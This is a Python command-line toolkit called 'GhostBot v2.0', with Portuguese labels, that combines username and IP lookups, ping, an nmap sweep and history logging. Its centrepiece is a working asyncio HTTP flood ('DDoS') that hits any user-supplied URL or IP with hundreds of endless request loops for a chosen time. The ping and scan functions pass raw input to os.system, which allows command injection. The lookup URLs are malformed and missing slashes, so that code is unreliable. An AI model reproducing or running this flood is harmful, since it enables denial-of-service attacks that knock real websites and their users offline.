#!/usr/bin/env python3

import os
import sqlite3
import requests
import datetime
import asyncio
import aiohttp
import sys
from rich.console import Console
from rich.table import Table

def clear():
    os.system("cls" if os.name == "nt" else "clear")

console = Console()
DB = "history.db"

# ==========================
# BANCO DE DADOS
# ==========================

def init_db():
    conn = sqlite3.connect(DB)
    cursor = conn.cursor()

    cursor.execute("""
    CREATE TABLE IF NOT EXISTS history(
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        tipo TEXT,
        consulta TEXT,
        data TEXT
    )
    """)

    conn.commit()
    conn.close()

def save_history(tipo, consulta):
    conn = sqlite3.connect(DB)
    cursor = conn.cursor()

    cursor.execute(
        "INSERT INTO history (tipo, consulta, data) VALUES (?, ?, ?)",
        (tipo, consulta, str(datetime.datetime.now()))
    )

    conn.commit()
    conn.close()

# ==========================
# USERNAME
# ==========================

def buscar_username():
    user = input("\nUsername: ")

    sites = {
        "GitHub": f"https://github.com{user}",
        "TikTok": f"https://tiktok.com@{user}",
        "Instagram": f"https://instagram.com{user}",
        "Reddit": f"https://reddit.com{user}",
        "Pinterest": f"https://pinterest.com{user}",
        "Twitch": f"https://twitch.tv{user}"
    }

    table = Table(title=f"Resultado para {user}")

    table.add_column("Site")
    table.add_column("HTTP")
    table.add_column("Status")
    table.add_column("Final URL")
    table.add_column("Tempo")

    headers = {
        "User-Agent": "Mozilla/5.0"
    }

    for site, url in sites.items():
        try:
            r = requests.get(
                url,
                headers=headers,
                timeout=5
            )

            tempo = round(
                r.elapsed.total_seconds(),
                2
            )
            if r.status_code == 404:
                status = "NÃO ENCONTRADO"
            else:
                status = "POSSIVELMENTE ENCONTRADO"

            table.add_row(
              site,
              str(r.status_code),
              status,
              r.url,
              f"{tempo}s"
            )
        except:
            table.add_row(
                site,
                "ERR",
                "ERRO",
                "",
                ""
            )

    console.print(table)
    save_history("USERNAME", user)

# ==========================
# IP LOOKUP
# ==========================

def consultar_ip():
    ip = input("\nIP: ")

    try:
        r = requests.get(
            f"http://ip-api.com{ip}"
        ).json()

        console.print("\n[green]Informações[/green]\n")

        for k, v in r.items():
            console.print(f"{k}: {v}")

        save_history("IP", ip)

    except Exception as e:
        console.print(f"[red]{e}[/red]")

# ==========================
# PING
# ==========================

def ping():
    host = input("\nHost: ")

    if os.name == "nt":
        os.system(f"ping {host}")
    else:
        os.system(f"ping -c 4 {host}")

    save_history("PING", host)

# ==========================
# SCANNER REDE
# ==========================

def scanner():
    rede = input(
        "\nRede (ex: 192.168.0.0/24): "
    )

    console.print(
        "\n[yellow]Use Nmap instalado no sistema[/yellow]\n"
    )

    os.system(f"nmap -sn {rede}")

    save_history("SCAN", rede)

# ==========================
# DDoS (CORRIGIDO)
# ==========================

async def http_flood_task(session, url):
    try:
        while True:
            try:
                async with session.get(url, timeout=aiohttp.ClientTimeout(total=2)) as resp:
                    await resp.read()
            except asyncio.CancelledError:
                raise
            except:
                pass
    except asyncio.CancelledError:
        pass

async def rodar_DDoS(url, conexoes, duracao):
    console.print(f"\n[bold yellow][*][/bold yellow] Disparando conexões contra [cyan]{url}[/cyan] por [cyan]{duracao}[/cyan] segundos...")
    connector = aiohttp.TCPConnector(limit=None, ttl_dns_cache=300)

    async with aiohttp.ClientSession(connector=connector) as session:
        tarefas = [asyncio.create_task(http_flood_task(session, url)) for _ in range(conexoes)]

        await asyncio.sleep(duracao)

        for task in tarefas:
            task.cancel()

        await asyncio.gather(*tarefas, return_exceptions=True)

    console.print("\n[bold green][+][/bold green] DDoS finalizado com sucesso!")

def DDoS():
    banner = r"""
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣠⣤⣤⣶⠶⠶⠶⠶⠶⠶⠶⢖⣦⣤⣄⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⡴⠞⠛⠉⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠉⠛⠻⠶⣤⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣴⠞⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠻⢶⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⠾⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⣦⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⣴⠟⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⢷⣆⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⣠⡞⠁⠀⠀⠀⠀⢀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡀⠀⠀⠀⠀⠈⠹⣦⡀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⢀⣼⠋⠀⠀⠀⢀⣤⣾⠟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⣷⣦⣀⠀⠀⠀⠈⢿⣄⠀⠀⠀⠀⠀
⠀⠀⠀⢀⡾⠁⠀⣠⡾⢁⣾⡿⡋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢿⣿⣆⠹⣦⠀⠀⢻⣆⠀⠀⠀⠀
⠀⠀⢀⡾⠁⢀⢰⣿⠃⠾⢋⡔⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠰⣿⠀⢹⣿⠄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⡌⠻⠆⢿⣧⢀⠀⢻⣆⠀⠀⠀
⠀⠀⣾⠁⢠⡆⢸⡟⣠⣶⠟⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⠞⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⢷⣦⡸⣿⠀⣆⠀⢿⡄⠀⠀
⠀⢸⡇⠀⣽⡇⢸⣿⠟⢡⠄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣉⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢤⠙⢿⣿⠀⣿⡀⠘⣿⠀⠀
⡀⣿⠁⠀⣿⡇⠘⣡⣾⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠿⠟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢷⣦⡙⠀⣿⡇⠀⢻⡇⠀
⢸⡟⠀⡄⢻⣧⣾⡿⢋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠻⣿⣴⣿⠉⡄⢸⣿⠀
⢾⡇⢰⣧⠸⣿⡏⢠⡎⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⠀⠓⢶⠶⠀⢀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣆⠙⣿⡟⢰⡧⠀⣿⠀
⣸⡇⠰⣿⡆⠹⣠⣿⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣠⣤⣤⣶⣿⡏⠀⠠⢺⠢⠀⠀⣿⣷⣤⣄⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣧⠸⠁⣾⡇⠀⣿⠀
⣿⡇⠀⢻⣷⠀⣿⡿⠰⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣿⣿⣿⣿⣿⣿⡅⠀⠀⢸⡄⠀⠀⣿⣿⣿⣿⣿⣿⣶⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢹⣿⡆⣰⣿⠁⠀⣿⠀
⢸⣧⠀⡈⢿⣷⣿⠃⣰⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿⡇⠀⠀⣿⣇⠀⢀⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⣸⡀⢿⣧⣿⠃⡀⢸⣿⠀
⠀⣿⡀⢷⣄⠹⣿⠀⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⡄⠀⣿⣿⠀⣼⣿⣿⣿⣿⣿⣿⣿⡯⠀⠀⠀⠀⠀⠀⠀⠀⣿⡇⢸⡟⢁⣴⠇⣼⡇⠀
⠀⢸⡇⠘⣿⣷⡈⢰⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣄⣿⣿⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⢰⣿⡧⠈⣴⣿⠏⢠⣿⠀⠀
⠀⠀⢿⡄⠘⢿⣿⣦⣿⣯⠘⣆⠀⠀⠀⠀⠀⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡀⠀⠀⠀⠀⠀⡎⢸⣿⣣⣾⡿⠏⠀⣾⠇⠀⠀
⠀⠀⠈⢷⡀⢦⣌⠛⠿⣿⡀⢿⣆⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⢀⣿⡁⣼⡿⠟⣉⣴⠂⣼⠏⠀⠀⠀
⠀⠀⠀⠈⢷⡈⠻⣿⣶⣤⡁⠸⣿⣆⠡⡀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⢀⣾⡟⠀⣡⣴⣾⡿⠁⣴⠏⠀⠀⠀⠀
⠀⠀⠀⠀⠈⢿⣄⠈⢙⠿⢿⣷⣼⣿⣦⠹⣶⣽⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⡄⢡⣾⣿⣶⣿⠿⢛⠉⢀⣾⠏⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠹⣧⡀⠳⣦⣌⣉⣙⠛⠃⠈⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠋⠐⠛⠋⣉⣉⣤⡶⠁⣰⡿⠁⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠈⠻⣦⡀⠙⠛⠿⠿⠿⠿⠟⠛⠛⣹⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣟⠙⠟⠛⠿⠿⠿⠿⠟⠛⠁⣠⡾⠋⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠛⢶⣄⠙⠶⣦⣤⣶⣶⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣶⣦⣤⡶⠖⣁⣴⠟⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠻⣶⣄⡉⠉⠉⠉⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠉⠉⠉⠉⣡⣴⡾⠛⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠛⠷⢦⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣠⣴⠶⠟⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠉⠛⠛⠿⠿⠿⠿⠿⠿⠿⠿⠿⠟⠛⠋⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀"""

    console.print(banner, style="bold red")
    console.print("\n[bold cyan]--- GHOSTBOT v2.0 | DDoS ---[/bold cyan]")
    alvo = input("Digite a URL ou IP alvo (Ex: 192.168.0.0 ou http://alvo.com): ").strip()

    if not alvo.startswith("http://") and not alvo.startswith("https://"):
        alvo = "http://" + alvo

    try:
        potencia = int(input("Nível de agressividade (Recomendado: 100-500): "))
        tempo = int(input("Duração do DDoS em segundos: "))
    except ValueError:
        console.print("[bold red][-] Erro: Digite apenas números inteiros.[/bold red]")
        return

    try:
        asyncio.run(rodar_DDoS(alvo, potencia, tempo))
        save_history("DDoS", f"Alvo: {alvo} | Conexões: {potencia} | Tempo: {tempo}s")
    except KeyboardInterrupt:
        console.print("\n[bold yellow][*] Interrompido pelo usuário.[/bold yellow]")

# ==========================
# RELATÓRIO
# ==========================

def gerar_relatorio():
    conn = sqlite3.connect(DB)
    cursor = conn.cursor()

    cursor.execute("SELECT * FROM history")
    dados = cursor.fetchall()
    conn.close()

    nome = (
        "relatorio_"
        + datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
        + ".txt"
    )

    with open(nome, "w", encoding="utf-8") as f:
        f.write("===== GHOSTBOT =====\n\n")
        for item in dados:
            f.write(str(item) + "\n")

    console.print(
        f"\n[green]Relatório salvo:[/green] {nome}"
    )

# ==========================
# HISTÓRICO
# ==========================

def historico():
    conn = sqlite3.connect(DB)
    cursor = conn.cursor()

    cursor.execute("SELECT * FROM history")
    dados = cursor.fetchall()
    conn.close()

    table = Table(title="Histórico")

    table.add_column("ID")
    table.add_column("Tipo")
    table.add_column("Consulta")
    table.add_column("Data")

    for row in dados:
        table.add_row(
            str(row[0]),
            row[1],
            row[2],
            row[3]
        )

    console.print(table)

# ==========================
# MENU
# ==========================

def banner():
    console.print(r"""
 ▄████  ██░ ██  ▒█████    ██████ ▄▄▄█████▓
██▒ ▀█▒▓██░ ██▒▒██▒  ██▒▒██    ▒ ▓  ██▒ ▓▒
▒██░▄▄▄░▒██▀▀██░▒██░  ██▒░ ▓██▄   ▒ ▓██░ ▒░
░▓█  ██▓░▓█ ░██ ▒██   ██░  ▒   ██▒░ ▓██▓ ░
░▒▓███▀▒░▓█▒░██▓░ ████▓▒░▒██████▒▒  ▒██▒ ░
 ░▒   ▒  ▒ ░░▒░▒░ ▒░▒░▒░ ▒ ▒▓▒ ▒ ░  ▒ ░░
  ░   ░  ▒ ░▒░ ░  ░ ▒ ▒░ ░ ░▒  ░ ░    ░
░ ░   ░  ░  ░░ ░░ ░ ░ ▒  ░  ░  ░    ░
      ░  ░  ░  ░    ░ ░        ░

      G H O S T B O T   v2.0
""", style="bold green")

    console.print(
    "[bold green]GhostBot v2.0[/bold green] | [cyan]OSINT & Network Toolkit[/cyan]\n")

def main():
    init_db()

    while True:
        clear()
        banner()

        print("""
[1] Buscar Username
[2] Consultar IP
[3] Ping
[4] Scanner da Rede
[5] DDoS
[6] Gerar Relatório
[7] Histórico
[0] Sair
""")

        op = input("Escolha: ")

        if op == "1":
            buscar_username()

        elif op == "2":
            consultar_ip()

        elif op == "3":
            ping()

        elif op == "4":
            scanner()

        elif op == "5":
            DDoS()

        elif op == "6":
            gerar_relatorio()

        elif op == "7":
            historico()

        elif op == "0":
            break

        input("\nENTER para continuar...")

if __name__ == "__main__":
    main()

